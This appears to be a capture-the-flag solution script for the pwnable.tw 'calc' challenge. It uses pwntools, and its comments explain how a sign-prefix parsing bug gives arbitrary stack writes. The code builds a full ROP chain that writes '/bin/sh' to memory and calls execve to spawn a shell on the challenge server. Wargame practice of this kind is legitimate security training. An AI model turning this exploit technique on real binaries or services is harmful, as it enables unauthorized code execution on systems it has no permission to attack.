#!/usr/bin/env python3
from pwn import *
URL = "chall.pwnable.tw"
PORT = 10100
if len(sys.argv) >= 2 and sys.argv[1] == "remote":
    p = remote(URL, PORT)
else:
    p = process("./bin/calc")

debug = b''
###############################
# Where to overflow?
#########################
# There are many buffers in this challenge.
#  1) pool in calc(): the structure is as follow
#     struct NumPool {
#         unsigned psize;
#         unsigned pool[0x64];
#     };
#     if we can change psize, arbitrary write is possible
#  2) expr buffer in calc(): consist of numeric and operations "+*-/%" and
#    overflow is impossible. so unlikely
#  3) local operation in parse_expr(): the buffer is used to store "%+-*/" so
#     it limits the address/canary to composed of these characters. While
#     sequential overflow is possible, unlikely for an exploit

###############################
# Rules
#############################
# get_expr: only allows user to input numeric and "+*-/%".
# parse_expr: to prevent division by zero, all atoi()-ed 0 is not allowed"
#            e.g. "01 + 01": ok
#                 "00 + 10": not ok



##################################
# NumPool vulnerabilities
##################################
# eval(): overwrite psize
#     for "+-" operations, it does "pool[psize-2] += "(or "-=").
#     This give us the opportunities to overwrite psize if psize == 1.
#     Specifically, the program wrongly assume the expr buffer should have
#     started with numeric. However, if the first character in expr buffer
#     is "+" or "-", the program will write something on the psize.
#
# parse_expr(): write


###################################
# High-level conclusion
#################################
# "+n": overwrite the pool size (psize) with n
#       ("-n" also works but we are not interested in address above 0xc0000000)
# "+n+m": pool[n] = m; (note that pool is an integer array)
#        Note that this also has a side effect that pool[n-1] += m;
#        PROS: we can make 0 using this rule
#        CONS: we have to ROP backward to prevent side effect


def arbit_write(n, m, debugging=False):
    global debug
    if m < 0:
        print("ERROR: please convert m into unsigned integer")
        quit()
    s = b"+n".replace(b"n", str(n // 4).encode('ascii'))
    if m > 2147483647:
        print("ERROR: please convert m into unsigned integer")
        quit()
    s += b"+m".replace(b"m", str(m).encode('ascii'))
    if debugging:
        debug += s + b'\n'
    return s

def arbit_read(n, debugging=False):
    global debug
    ## we need to plus 1 because
    s = b'+n'.replace(b'n', str(1 + n // 4).encode('ascii'))
    if debugging:
        debug += s + b'\n'
    return s

EBP_POOL_OFFSET = 0x59c
EBP_BUFFER_OFFSET = 0x40c
CALC_RETADDR_OFFSET = -4
POOL_TO_RETADDR_OFFSET = EBP_POOL_OFFSET - CALC_RETADDR_OFFSET



INTERRUPT = 0x807087f
"""
p.recvuntil(b"===")
p.recvline()
p.sendline(arbit_read(EBP_POOL_OFFSET, debugging=True))
leaked_prev_ebp = p.recvline()
prev_ebp_addr = (int(leaked_prev_ebp) + (1 << 32)) % (1 << 32)

# main+ 3: and $0xfffffff0, %%esp => cannot get current ebp accurately
buffer_addr = prev_ebp_addr - 0x800
"""

# a constant writable address at load time, we will use it for "/bin/sh\0"
buf_addr = 0x80ebf40

stack = []
# read(0, buffer, size)
POP3_RET = 0x804cfe7
FUNC_READ = 0x806e6d0
stack.append(arbit_write(POOL_TO_RETADDR_OFFSET + 0x0, FUNC_READ))
stack.append(arbit_write(POOL_TO_RETADDR_OFFSET + 0x4, POP3_RET))
stack.append(arbit_write(POOL_TO_RETADDR_OFFSET + 0xc, buf_addr))
stack.append(arbit_write(POOL_TO_RETADDR_OFFSET + 0xc,
                                        (1 << 31) - buf_addr + 1))
stack.append(arbit_write(POOL_TO_RETADDR_OFFSET + 0x8, (1 << 31) - 1))
stack.append(arbit_write(POOL_TO_RETADDR_OFFSET + 0x10, len("/bin/sh\0")))

# ecx = 0
# 0x8049f13: xor ecx, ecx ; pop ebx ; mov eax, ecx ; pop esi ;
#             pop edi ; pop ebp; ret; (Intel style)
XOR_ECX_RET = 0x8049f13
DUMMY = 0x1337
stack.append(arbit_write(POOL_TO_RETADDR_OFFSET + 0x14, XOR_ECX_RET))
stack.append(arbit_write(POOL_TO_RETADDR_OFFSET + 0x18, DUMMY))
stack.append(arbit_write(POOL_TO_RETADDR_OFFSET + 0x1c, DUMMY)) # ESI
stack.append(arbit_write(POOL_TO_RETADDR_OFFSET + 0x20, DUMMY)) # EDI
stack.append(arbit_write(POOL_TO_RETADDR_OFFSET + 0x24, DUMMY))

# edx = 0, ebx = buffer
# 0x808c2ed: xor edx, edx ; pop ebx ; div esi ; pop esi ; pop edi ; pop ebp ; ret
XOR_EDX_POPBX_RET = 0x808c2ed
stack.append(arbit_write(POOL_TO_RETADDR_OFFSET + 0x28, XOR_EDX_POPBX_RET))
stack.append(arbit_write(POOL_TO_RETADDR_OFFSET + 0x2c, buf_addr))
stack.append(arbit_write(POOL_TO_RETADDR_OFFSET + 0x30, DUMMY))
stack.append(arbit_write(POOL_TO_RETADDR_OFFSET + 0x34, DUMMY))
stack.append(arbit_write(POOL_TO_RETADDR_OFFSET + 0x38, DUMMY))

# eax = 0x3b,
POPAX_RET = 0x805c34b
SYS_EXECVE = 0xb
stack.append(arbit_write(POOL_TO_RETADDR_OFFSET + 0x3c, POPAX_RET))
stack.append(arbit_write(POOL_TO_RETADDR_OFFSET + 0x40, SYS_EXECVE))
stack.append(arbit_write(POOL_TO_RETADDR_OFFSET + 0x44, INTERRUPT))

while stack:
    s = stack.pop()
    p.sendline(s)
    p.recvline()
    debug += s + b'\n'


p.sendline()
p.send(b'/bin/sh\0')
with open("debug", "wb") as f:
    f.write(debug + b'\n' + b"/bin/sh\0")
    f.close()

p.interactive()
